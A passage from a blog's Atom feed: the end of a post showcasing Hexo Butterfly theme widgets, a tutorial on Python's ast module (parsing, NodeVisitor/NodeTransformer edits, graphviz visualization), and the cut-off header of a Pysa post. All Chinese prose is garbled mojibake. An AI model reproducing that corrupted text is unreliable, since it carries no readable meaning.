    <content type="html"><![CDATA[<h1 id="é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰"><a href="#é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰" class="headerlink" title="é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰"></a>é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰</h1><p>åˆ†è¡Œé—´è·ä¼šå¾ˆ</p><mark class="hl-label default">ç°è‰²</mark> <p>å¤§</p><mark class="hl-label blue">è“è‰²</mark> <mark class="hl-label pink">ç²‰è‰²</mark> <mark class="hl-label red">çº¢è‰²</mark> <mark class="hl-label purple">ç´«è‰²</mark> <mark class="hl-label orange">æ©™è‰²</mark> <mark class="hl-label green">ç»¿è‰²</mark> <h1 id="å†…è”å›¾ç‰‡"><a href="#å†…è”å›¾ç‰‡" class="headerlink" title="å†…è”å›¾ç‰‡"></a>å†…è”å›¾ç‰‡</h1><p>é«˜åº¦ 150px å¯é€‰ <img class="inline-img" src="https://i.loli.net/2021/06/14/oSn9dxfYhEHClIe.jpg" style="height:150px"/> åé¢ç»§ç»­æ¥æ–‡å­—ã€‚</p><h1 id="ç›¸å†Œï¼ˆgalleryï¼‰"><a href="#ç›¸å†Œï¼ˆgalleryï¼‰" class="headerlink" title="ç›¸å†Œï¼ˆgalleryï¼‰"></a>ç›¸å†Œï¼ˆgalleryï¼‰</h1><div class="fj-gallery"><p><img src="https://i.loli.net/2021/06/14/2NXqsznriG8blc7.jpg"><br><img src="https://i.loli.net/2021/06/14/jcdZBHXx9TskmrM.jpg"></p>          </div><h1 id="é€‰é¡¹å¡ï¼ˆTabï¼‰"><a href="#é€‰é¡¹å¡ï¼ˆTabï¼‰" class="headerlink" title="é€‰é¡¹å¡ï¼ˆTabï¼‰"></a>é€‰é¡¹å¡ï¼ˆTabï¼‰</h1><div class="tabs" id="test"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test-1">test 1</button></li><li class="tab"><button type="button" data-href="#test-2">test 2</button></li><li class="tab"><button type="button" data-href="#test-3">test 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>é¢„è®¾é€‰æ‹©ï¼š</p><ul><li>é»˜è®¤æ˜¾ç¤ºç¬¬ 3 ä¸ªï¼š<code>&#123;% tabs test, 3 %&#125;</code></li></ul><p>è‡ªå®šä¹‰åç§°ï¼š</p><ul><li>åç§°ï¼š<code>&lt;!-- tab æµ‹è¯• --&gt;</code></li><li>å›¾æ ‡ï¼š<code>&lt;!-- tab @fas fa-bomb --&gt;</code></li><li>å›¾æ ‡+åç§°ï¼š<code>&lt;!-- tab ç‚¸å¼¹@fas fa-bomb --&gt;</code>ï¼ˆå¿…é¡»åè¿‡æ¥å†™ï¼‰</li></ul><h1 id="æŒ‰é’®ï¼ˆButtonï¼‰"><a href="#æŒ‰é’®ï¼ˆButtonï¼‰" class="headerlink" title="æŒ‰é’®ï¼ˆButtonï¼‰"></a>æŒ‰é’®ï¼ˆButtonï¼‰</h1><a class="btn-beautify " href="https://jckling.github.io/"   title="Jckling"><span>Jckling</span></a><a class="btn-beautify " href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify outline" href="https://jckling.github.io/"   title="Jckling"><span>Jckling</span></a><a class="btn-beautify outline" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><a class="btn-beautify block" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify block center larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify block right outline larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><a class="btn-beautify larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify blue larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify pink larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify red larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify purple larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify orange larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify green larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><div class="btn-center"><a class="btn-beautify outline larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify outline blue larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify outline pink larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify outline red larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify outline purple larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify outline orange larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify outline green larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a></div><h1 id="æ ‡ç­¾ï¼ˆTagï¼‰"><a href="#æ ‡ç­¾ï¼ˆTagï¼‰" class="headerlink" title="æ ‡ç­¾ï¼ˆTagï¼‰"></a>æ ‡ç­¾ï¼ˆTagï¼‰</h1><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><div class="note simple"><p>é»˜è®¤</p></div><div class="note default simple"><p>default</p></div><div class="note primary simple"><p>primary</p></div><div class="note success simple"><p>success</p></div><div class="note info simple"><p>info</p></div><div class="note warning simple"><p>warning</p></div><div class="note danger simple"><p>danger</p></div><h2 id="morden"><a href="#morden" class="headerlink" title="morden"></a>morden</h2><div class="note modern"><p>é»˜è®¤</p></div><div class="note default modern"><p>default</p></div><div class="note primary modern"><p>primary</p></div><div class="note success modern"><p>success</p></div><div class="note info modern"><p>info</p></div><div class="note warning modern"><p>warning</p></div><div class="note danger modern"><p>danger</p></div><h2 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h2><div class="note flat"><p>é»˜è®¤</p></div><div class="note default flat"><p>default</p></div><div class="note primary flat"><p>primary</p></div><div class="note success flat"><p>success</p></div><div class="note info flat"><p>info</p></div><div class="note warning flat"><p>warning</p></div><div class="note danger flat"><p>danger</p></div><h2 id="disabled"><a href="#disabled" class="headerlink" title="disabled"></a>disabled</h2><div class="note disabled"><p>é»˜è®¤</p></div><div class="note default disabled"><p>default</p></div><div class="note primary disabled"><p>primary</p></div><div class="note success disabled"><p>success</p></div><div class="note info disabled"><p>info</p></div><div class="note warning disabled"><p>warning</p></div><div class="note danger disabled"><p>danger</p></div><h2 id="é¢œè‰²å’Œå›¾æ ‡"><a href="#é¢œè‰²å’Œå›¾æ ‡" class="headerlink" title="é¢œè‰²å’Œå›¾æ ‡"></a>é¢œè‰²å’Œå›¾æ ‡</h2><div class="note blue flat"><p>fas fa-bullhorn</p></div><div class="note icon flat"><i class="note-icon fas fa-bullhorn"></i><p>fas fa-bullhorn</p></div><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>fas fa-bullhorn</p></div><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>ç¿»æ–‡æ¡£ï¼š</p><ul><li><a href="https://butterfly.js.org/posts/ceeb73f/">Butterfly å®‰è£æ–‡æª”(å››) ä¸»é¡Œé…ç½®-2</a></li><li><a href="https://butterfly.js.org/posts/507c070f/">Butterflyæ·»åŠ å…¨å±€å¸åº•Aplayeræ•™ç¨‹</a></li></ul>]]></content>
    
    
    <summary type="html">æ¸²æŸ“ä¸€äº›ä¼šç”¨åˆ°ï¼Œä½†æ¯æ¬¡éƒ½å¾—ç¿»æ–‡æ¡£æ‰¾çš„ä¸œè¥¿ğŸ˜…</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>Python ast æ¨¡å—ä½¿ç”¨</title>
    <link href="https://jckling.github.io/2021/07/14/Other/Python%20ast%20%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/"/>
    <id>https://jckling.github.io/2021/07/14/Other/Python%20ast%20%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</id>
    <published>2021-07-14T06:30:05.000Z</published>
    <updated>2022-03-08T09:03:12.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-æºç ç¼–è¯‘è¿‡ç¨‹"><a href="#Python-æºç ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="Python æºç ç¼–è¯‘è¿‡ç¨‹"></a>Python æºç ç¼–è¯‘è¿‡ç¨‹</h1><p>Python æºç åˆ°æœºå™¨ç çš„è¿‡ç¨‹ï¼Œä»¥ CPython ä¸ºä¾‹ï¼Œç¼–è¯‘è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å°†æºä»£ç è§£æä¸ºè§£ææ ‘ï¼ˆParser Treeï¼‰</li><li>å°†è§£ææ ‘è½¬æ¢ä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ˆAbstract Syntax Treeï¼‰</li><li>å°†æŠ½è±¡è¯­æ³•æ ‘è½¬æ¢åˆ°æ§åˆ¶æµå›¾ï¼ˆControl Flow Graphï¼‰</li><li>æ ¹æ®æµå›¾å°†å­—èŠ‚ç ï¼ˆbytecodeï¼‰å‘é€ç»™è™šæ‹Ÿæœºï¼ˆcevalï¼‰</li></ul><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ¨¡å—è¿›è¡Œæ“ä½œï¼š</p><ul><li>ast æ¨¡å—å¯ä»¥æ§åˆ¶æŠ½è±¡è¯­æ³•æ ‘çš„ç”Ÿæˆå’Œç¼–è¯‘</li><li>py-compile æ¨¡å—èƒ½å¤Ÿå°†æºç æ¢æˆå­—èŠ‚ç ï¼ˆç¼–è¯‘ï¼‰ï¼Œä¿å­˜åœ¨ __pycache__ æ–‡ä»¶å¤¹ï¼Œä»¥ <code>.pyc</code> ç»“å°¾ï¼ˆä¸å¯è¯»ï¼‰</li><li>dis æ¨¡å—é€šè¿‡åæ±‡ç¼–æ”¯æŒå¯¹å­—èŠ‚ç çš„åˆ†æï¼ˆå¯è¯»ï¼‰</li></ul><h1 id="ast-æ¨¡å—ä½¿ç”¨"><a href="#ast-æ¨¡å—ä½¿ç”¨" class="headerlink" title="ast æ¨¡å—ä½¿ç”¨"></a>ast æ¨¡å—ä½¿ç”¨</h1><p>ast æ¨¡å—å¯ä»¥ç”¨äºç”Ÿæˆå’Œç¼–è¯‘ Python ä»£ç çš„æŠ½è±¡è¯­æ³•æ ‘ï¼Œè®¸å¤šé™æ€åˆ†æå·¥å…·éƒ½ä½¿ç”¨è¯¥æ¨¡å—ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ã€‚</p><p><code>ast.parse()</code> å‡½æ•°å¯ä»¥ç”¨æ¥ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œ<code>ast.compile()</code> å¯ä»¥å°†æŠ½è±¡è¯­æ³•æ ‘ç¼–è¯‘ä¸ºä»£ç ã€‚</p><p>ç”¨ä¸‹åˆ—ä»£ç ä½œä¸ºæµ‹è¯•æ ·ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nums</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;even: &quot;</span>, i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot; odd: &quot;</span>, i)</span><br><span class="line"></span><br><span class="line">nums()</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘æ‰§è¡Œ"><a href="#ç¼–è¯‘æ‰§è¡Œ" class="headerlink" title="ç¼–è¯‘æ‰§è¡Œ"></a>ç¼–è¯‘æ‰§è¡Œ</h2><p>ä»£ç å¯¹è±¡æ˜¯ CPython å®ç°çš„ä½çº§ç»†èŠ‚ï¼Œæ¶‰åŠ code æ¨¡å—ï¼Œè¯¥æ¨¡å—æ˜¯è§£é‡Šå™¨åŸºç±»ï¼Œå¯ç”¨äºè‡ªå®šä¹‰ Python è§£é‡Šå™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¯»å–æºæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;demo.py&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¯ä»¥è¢« exec() æˆ– eval() æ‰§è¡Œçš„ä»£ç å¯¹è±¡</span></span><br><span class="line">cm = <span class="built_in">compile</span>(data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">exec(cm)</span><br></pre></td></tr></table></figure><h2 id="ç”Ÿæˆ-AST"><a href="#ç”Ÿæˆ-AST" class="headerlink" title="ç”Ÿæˆ AST"></a>ç”Ÿæˆ AST</h2><p>ç›´æ¥ä»æºç ç”Ÿæˆï¼ŒPython 3.9 æ”¯æŒ <code>indent</code> å‚æ•°ï¼Œæ‰“å°è¾“å‡ºæ›´ä¸ºå‹å¥½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f_ast = ast.parse(data)</span><br><span class="line">print(ast.dump(f_ast, indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Module( <span class="comment"># ç¬¬ä¸€çº§ï¼Œæ¨¡å—</span></span><br><span class="line">    body=[</span><br><span class="line">        FunctionDef( <span class="comment"># ç¬¬äºŒçº§ï¼Œå‡½æ•°å®šä¹‰</span></span><br><span class="line">            name=<span class="string">&#x27;nums&#x27;</span>, <span class="comment"># å‡½æ•°åç§°</span></span><br><span class="line">            args=arguments( <span class="comment"># å‚æ•°</span></span><br><span class="line">                posonlyargs=[],</span><br><span class="line">                args=[],</span><br><span class="line">                kwonlyargs=[],</span><br><span class="line">                kw_defaults=[],</span><br><span class="line">                defaults=[]),</span><br><span class="line">            body=[ <span class="comment"># å‡½æ•°ä½“</span></span><br><span class="line">                For( <span class="comment"># å¾ªç¯</span></span><br><span class="line">                    target=Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Store()),</span><br><span class="line">                    iter=Call( <span class="comment"># é€’å½’å‡½æ•°è°ƒç”¨</span></span><br><span class="line">                        func=Name(id=<span class="string">&#x27;range&#x27;</span>, ctx=Load()),</span><br><span class="line">                        args=[</span><br><span class="line">                            Constant(value=2)], <span class="comment"># å‚æ•°</span></span><br><span class="line">                        keywords=[]),</span><br><span class="line">                    body=[ <span class="comment"># å¾ªç¯ä½“</span></span><br><span class="line">                        If( <span class="comment"># æ¡ä»¶åˆ¤æ–­</span></span><br><span class="line">                            <span class="built_in">test</span>=Compare(<span class="comment"># æ¯”è¾ƒ</span></span><br><span class="line">                                left=BinOp( <span class="comment"># å·¦æ“ä½œæ•°</span></span><br><span class="line">                                    left=Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load()), <span class="comment"># å·¦æ“ä½œæ•°</span></span><br><span class="line">                                    op=Mod(), <span class="comment"># æ“ä½œç¬¦</span></span><br><span class="line">                                    right=Constant(value=2)), <span class="comment"># å³æ“ä½œæ•°</span></span><br><span class="line">                                ops=[</span><br><span class="line">                                    Eq()],</span><br><span class="line">                                comparators=[ <span class="comment"># å³æ“ä½œæ•°</span></span><br><span class="line">                                    Constant(value=0)]),</span><br><span class="line">                            body=[ <span class="comment"># ä¸ºçœŸ</span></span><br><span class="line">                                Expr(</span><br><span class="line">                                    value=Call( <span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line">                                        func=Name(id=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                        args=[</span><br><span class="line">                                            Constant(value=<span class="string">&#x27;even: &#x27;</span>),</span><br><span class="line">                                            Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load())],</span><br><span class="line">                                        keywords=[]))],</span><br><span class="line">                            orelse=[ <span class="comment"># ä¸ºå‡</span></span><br><span class="line">                                Expr(</span><br><span class="line">                                    value=Call( <span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line">                                        func=Name(id=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                        args=[</span><br><span class="line">                                            Constant(value=<span class="string">&#x27; odd: &#x27;</span>),</span><br><span class="line">                                            Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load())],</span><br><span class="line">                                        keywords=[]))])],</span><br><span class="line">                    orelse=[])],</span><br><span class="line">            decorator_list=[]),</span><br><span class="line">        Expr( <span class="comment"># ç¬¬äºŒçº§ï¼Œè¡¨è¾¾å¼è¯­å¥</span></span><br><span class="line">            value=Call( <span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line">                func=Name(id=<span class="string">&#x27;nums&#x27;</span>, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]))],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure><h2 id="éå†-AST"><a href="#éå†-AST" class="headerlink" title="éå† AST"></a>éå† AST</h2><h2 id="ä¿®æ”¹-AST"><a href="#ä¿®æ”¹-AST" class="headerlink" title="ä¿®æ”¹ AST"></a>ä¿®æ”¹ AST</h2><p>æœ‰ä¸¤ç§æ–¹å¼ï¼šâ‘ ä¿®æ”¹ AST èŠ‚ç‚¹ï¼›â‘¡æ›¿æ¢ AST èŠ‚ç‚¹ã€‚ast æ¨¡å—æä¾›äº† <code>NodeVisitor</code> å’Œ <code>NodeTransformer</code> å®ç°è¿™ä¸¤ç§åŠŸèƒ½ã€‚</p><ol><li><p>å°† <code>i%2 == 0</code>ä¿®æ”¹ä¸º <code>i+2==0</code></p><ul><li><code>ast.NodeVisitor.visit</code> å¦‚æœæ²¡æœ‰å®ç°å¯¹è±¡çš„ <code>visit_classname</code> æ–¹æ³•ï¼Œåˆ™è°ƒç”¨ <code>generic_visit</code> æ–¹æ³•</li><li><code>ast.NodeVisitor.generic_visit</code> åœ¨å­èŠ‚ç‚¹ä¸Šè°ƒç”¨ <code>visit</code> æ–¹æ³•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeVisitor</span>(<span class="params">ast.NodeVisitor</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit_BinOp</span>(<span class="params">self, node</span>):</span> <span class="comment"># ä¿®æ”¹æ“ä½œç¬¦</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.op, ast.Mod):</span><br><span class="line">            node.op = ast.Add()</span><br><span class="line">        self.generic_visit(node) <span class="comment"># éå†å­èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line">visitor = NodeVisitor()</span><br><span class="line">visitor.visit(f_ast) <span class="comment"># éå†</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">odd:  0</span><br><span class="line">odd:  1</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ <code>else</code> èŠ‚ç‚¹</p><ul><li>è°ƒç”¨ <code>compile()</code> å‡½æ•°æ—¶ç¼ºå¤± <code>lineno</code> å’Œ <code>col_offset</code> å±æ€§ï¼Œä½¿ç”¨ <code>ast.fix_missing_locations</code> å‡½æ•°æ·»åŠ </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeTransformer</span>(<span class="params">ast.NodeTransformer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit_If</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        <span class="keyword">return</span> ast.If(</span><br><span class="line">            test=node.test,</span><br><span class="line">            body=node.body,</span><br><span class="line">            orelse=[]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">transformer = NodeTransformer()</span><br><span class="line">f_ast = transformer.visit(f_ast) <span class="comment"># è¿”å›æ–°çš„ AST</span></span><br><span class="line">ast.fix_missing_locations(f_ast)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">even:  0</span><br></pre></td></tr></table></figure></li></ol><h2 id="å¯è§†åŒ–-AST"><a href="#å¯è§†åŒ–-AST" class="headerlink" title="å¯è§†åŒ– AST"></a>å¯è§†åŒ– AST</h2><p>ä½¿ç”¨ graphviz ç»˜åˆ¶ï¼Œéå† AST èŠ‚ç‚¹ï¼Œå°†æ¯ä¸ªèŠ‚ç‚¹å¯¹è±¡çš„ç±»å‹åç§°ä½œä¸ºç‚¹ï¼Œçˆ¶èŠ‚ç‚¹å’Œæ¯ä¸ªå­èŠ‚ç‚¹éƒ½è¿ä¸€æ¡è¾¹ã€‚</p><div class="note info flat"><ol><li><p>å®‰è£… graphviz äºŒè¿›åˆ¶ç¨‹åº ğŸ‘‰ <a href="https://graphviz.org/download/">https://graphviz.org/download/</a></p></li><li><p>pip å®‰è£…åŒ…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install graphviz</span><br></pre></td></tr></table></figure></li></ol></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span>(<span class="params">node, nodes, pindex, g</span>):</span></span><br><span class="line">    name = <span class="built_in">str</span>(<span class="built_in">type</span>(node).__name__)</span><br><span class="line">    index = <span class="built_in">len</span>(nodes)</span><br><span class="line">    nodes.append(index)</span><br><span class="line">    g.node(<span class="built_in">str</span>(index), name)</span><br><span class="line">    <span class="keyword">if</span> index != pindex:</span><br><span class="line">        g.edge(<span class="built_in">str</span>(index), <span class="built_in">str</span>(pindex))</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> ast.iter_child_nodes(node):</span><br><span class="line">        visit(n, nodes, index, g)</span><br><span class="line">    </span><br><span class="line">graph = Digraph(<span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">tree = ast.parse(data)</span><br><span class="line">visit(tree, [], <span class="number">0</span>, graph)</span><br><span class="line">graph.render(<span class="string">&quot;test&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ test.png å¦‚ä¸‹ï¼š</p><img src="https://i.loli.net/2021/07/15/3lrJHjtdRuTW9oY.png"><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://kamneemaran45.medium.com/python-ast-5789a1b60300">Python AST</a></li><li><a href="https://devguide.python.org/compiler/">25. Design of CPythonâ€™s Compiler</a></li><li><a href="https://docs.python.org/zh-cn/3/c-api/code.html">ä»£ç å¯¹è±¡</a></li><li><a href="https://docs.python.org/zh-cn/3/library/ast.html">ast â€” æŠ½è±¡è¯­æ³•æ ‘</a></li><li><a href="https://docs.python.org/zh-cn/3/library/py_compile.html">py_compile â€” ç¼–è¯‘ Python æºæ–‡ä»¶</a></li><li><a href="https://docs.python.org/zh-cn/3/library/dis.html">dis â€” Python å­—èŠ‚ç åæ±‡ç¼–å™¨</a></li><li><a href="https://qiita.com/kaityo256/items/e83b369ba7518da0a519">Pythonã®æŠ½è±¡æ§‹æ–‡æœ¨ã‚’Graphvizã§å¯è¦–åŒ–ã™ã‚‹</a></li></ul>]]></content>
    
    
    <summary type="html">ä½¿ç”¨ ast æ¨¡å—æ“ä½œæŠ½è±¡è¯­æ³•æ ‘ï¼Œä¿®æ”¹/æ›¿æ¢èŠ‚ç‚¹ã€‚</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Pyre æ±¡ç‚¹åˆ†æå·¥å…· Pysa ä½¿ç”¨æ•™ç¨‹</title>
    <link href="https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/"/>
    <id>https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/</id>
    <published>2021-07-07T03:39:19.000Z</published>
    <updated>2021-07-12T11:11:00.000Z</updated>
    
